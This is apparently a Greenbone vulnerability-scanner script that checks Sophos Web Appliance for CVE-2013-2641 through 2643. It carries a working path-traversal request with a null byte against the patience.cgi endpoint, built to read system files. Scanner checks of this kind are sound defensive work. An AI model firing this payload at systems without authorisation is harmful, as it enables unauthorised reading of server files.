# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:sophos:web_appliance";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103688");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-04-04 14:28:20 +0200 (Thu, 04 Apr 2013)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2013-2641", "CVE-2013-2642", "CVE-2013-2643");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Sophos Web Appliance Web Interface Multiple Vulnerabilities (Feb 2013) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_sophos_web_appliance_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("sophos/web_appliance/http/detected");

  script_tag(name:"summary", value:"Sophos Web Appliance Web Interface is prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - CVE-2013-2641 / Unauthenticated local file disclosure: Unauthenticated users can read arbitrary
  files from the filesystem with the privileges of the 'spiderman' operating system user.

  - CVE-2013-2642 / OS command injection: Authenticated users can execute arbitrary commands on the
  underlying operating system with the privileges of the 'spiderman' operating system user.

  - CVE-2013-2643 / Cross Site Scripting (XSS): Reflected Cross Site Scripting vulnerabilities were
  found. An attacker could have used these vulnerabilities to conduct phishing attacks.");

  script_tag(name:"solution", value:"The vendor released version 3.7.8.2 to address these issues.

  Please see the references and contact the vendor for information on how to obtain and apply the
  updates.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20140801055954/http://www.sophos.com/en-us/support/knowledgebase/118969.aspx");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = "/cgi-bin/patience.cgi?id=../../../../../../../" + file + "%00";

  req = http_get( port:port, item:url );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( egrep( pattern:pattern, string:res ) ) {
    report = "By requesting the URL " + http_report_vuln_url( port:port, url:url, url_only:TRUE ) +
             '\nit was possible to retrieve the file /' + file + '. Response:\n\n' + chomp( res );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
